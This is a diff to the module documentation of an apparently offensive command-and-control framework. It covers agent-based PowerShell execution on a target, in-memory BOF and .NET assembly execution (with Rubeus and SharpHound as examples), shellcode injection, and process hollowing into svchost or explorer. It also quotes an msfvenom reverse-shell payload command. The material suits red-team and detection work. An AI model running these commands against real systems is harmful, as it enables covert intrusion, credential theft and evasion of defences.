@@ -2,7 +2,7 @@
 
 ## Powershell
 
-This `pwsh` module helps operators run their own extendible powershell scripts on a targest's Windows machine via an active agent session
+This `pwsh` module helps operators run their own extendible powershell scripts on a target's Windows machine via an active agent session
 
 ### Compatibility:
 - Go_agent
@@ -14,9 +14,20 @@ This `pwsh` module helps operators run their own extendible powershell scripts o
 ```
 modules info pwsh
 pwsh <script_path> [agent_id=<agent_id>] [arguments=<script_arguments>]
+# Examples:
+pwsh my_script.ps1
+pwsh my_script.ps1 agent_id=abc123-4567-8901-2345-67890abcdef1
+pwsh my_script.ps1 arguments="-param1 value1 -param2 value2"
 ```
 
-## Inline-Execute
+### File Location Resolution
+When only a script filename is provided (without a full path), the module will automatically search for the PowerShell script in the following locations in order:
+1. `modules/external/<filename>` - The general external directory
+2. Direct relative paths from the current working directory
+
+If the PowerShell script is not found, the command will return an error.
+
+## Execute-BOF
 
 This module interfaces with an agent and enables pure in-memory execution of Beacon Object Files (BOFs) without any disk writes. The solution leverages the goffloader library to execute BOFs directly in the agent's memory space.
 
@@ -25,22 +36,33 @@ This module interfaces with an agent and enables pure in-memory execution of Bea
 - Windows x64
 
 #### Usage
-1. Place BOFs in modules/external of the C2 Server
-2. Use the module with a BOF path
+1. Place BOFs in the `modules/external/` or `modules/external/bof/` directories on the C2 Server
+2. Use the module with a BOF filename (path will be resolved automatically)
 3. The agent will in-memory execute the BOF using its COFFloader library
 4. BOF results are captured and sent back through C2 channel to operator
 5. No files written to disk at any stage; complete execution in agent's memory space
 
 ### Command syntax
-Execute BOFs using the inline-execute command:
+Execute BOFs using the execute-bof command:
 
 ```
-modules info inline-execute
+modules info execute-bof
 # In interactive mode, the agent ID is automatically inferred:
-inline-execute <path_to_bof_file> [arguments]
+execute-bof <bof_filename> [arguments]
+# Examples:
+execute-bof whoami.x64.o
+execute-bof whoami.x64.o -h
 ```
 
-## Inline-Execute-Assembly
+### File Location Resolution
+When only a filename is provided (without a full path), the module will automatically search for the BOF file in the following locations in order:
+1. `modules/external/bof/<filename>` - The dedicated BOF subdirectory
+2. `modules/external/<filename>` - The general external directory
+3. Direct relative paths from the current working directory
+
+If the BOF file is not found, the command will return an error listing all available BOF files in the external directories.
+
+## Execute-Assembly
 
 This module interfaces with an agent and enables in-memory execution of .NET assemblies without any disk writes. The solution leverages the go-clr library to execute .NET assemblies directly in the agent's memory space, supporting both .NET executables (.exe) and libraries (.dll).
 
@@ -49,19 +71,22 @@ This module interfaces with an agent and enables in-memory execution of .NET ass
 - Windows x64
 
 #### Usage
-1. Place .NET assemblies in accessible locations on the C2 Server
-2. Use the module with an assembly file path
+1. Place .NET assemblies in the `modules/external/` or `modules/external/assemblies/` directories on the C2 Server
+2. Use the module with an assembly filename (path will be resolved automatically)
 3. The agent will load the CLR runtime and execute the assembly in-memory
 4. Assembly output is captured and sent back through the C2 channel to the operator
 5. No files written to disk at any stage; complete execution in agent's memory space
 
 ### Command syntax
-Execute .NET assemblies using the inline-assembly command:
+Execute .NET assemblies using the execute-assembly command:
 
 ```
-modules info inline-assembly
+modules info execute-assembly
 # In interactive mode, the agent ID is automatically inferred:
-inline-execute-assembly <assembly_path> [agent_id=<agent_id>]
+execute-assembly <assembly_filename> [agent_id=<agent_id>]
+# Examples:
+execute-assembly Rubeus.exe
+execute-assembly SharpHound.exe agent_id=abc123-4567-8901-2345-67890abcdef1
 ```
 
 ### Key Features:
@@ -70,10 +95,19 @@ inline-execute-assembly <assembly_path> [agent_id=<agent_id>]
 - Handles both .NET executables and libraries
 - Direct in-memory execution without file system access
 - Compatible with tools like Rubeus, SharpHound, and other .NET utilities
+- Supports both positional arguments and named parameters (e.g., `execute-assembly Rubeus.exe` or `execute-assembly assembly_path=Rubeus.exe`)
+
+### File Location Resolution
+When only a filename is provided (without a full path), the module will automatically search for the assembly file in the following locations in order:
+1. `modules/external/assemblies/<filename>` - The dedicated assemblies subdirectory
+2. `modules/external/<filename>` - The general external directory
+3. Direct relative paths from the current working directory
+
+If the assembly file is not found, the command will return an error listing all available assembly files (.exe, .dll) in the external directories.
 
 ## PInject
 
-This module interfaces with an active agent for In-memory shellcode injection into a sacrificial process
+This module interfaces with an active agent for In-memory shellcode injection into a sacrificial process using CreateRemoteThread
 
 #### Compatibility
 - Go_agent
@@ -127,17 +161,31 @@ This module interfaces with an agent and enables In-memory Injection of an unman
 
 #### Usage
 1. Generate compatible PE payload using msfvenom
-2. Parse the `pe_file` path on the C2 server as a required argument of the peinject module
-3. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
+2. Place the PE file in the `modules/external/` directory on the C2 server
+3. Parse the `pe_file` name (path will be resolved automatically) as a required argument of the peinject module
+4. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
 
 #### msfvenom Command Syntax
 
 ```
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
 
-peinject pe_file=<payload_path> # METHOD - 1 (Interactive mode)
-run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+peinject pe_file=<payload_filename> # METHOD - 1 (Interactive mode) - File will be resolved automatically
+run peinject pe_file=<payload_filename> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
+
+# Examples:
+
+peinject payload.exe
+peinject payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
+
+peinject pe_file=payload.exe
+peinject pe_file=payload.exe agent_id=abc123-4567-8901-2345-67890abcdef1
 ```
+
+#### File Location Resolution
+When only a filename is provided (without a full path), the module will automatically search for the PE file in the following locations in order:
+1. `modules/external/<filename>` - The general external directory
+2. Direct relative paths from the current working directory
 
 #### PE Injection Flow
 1. Parses and validates the DOS header and NT headers to ensure the file is a valid PE
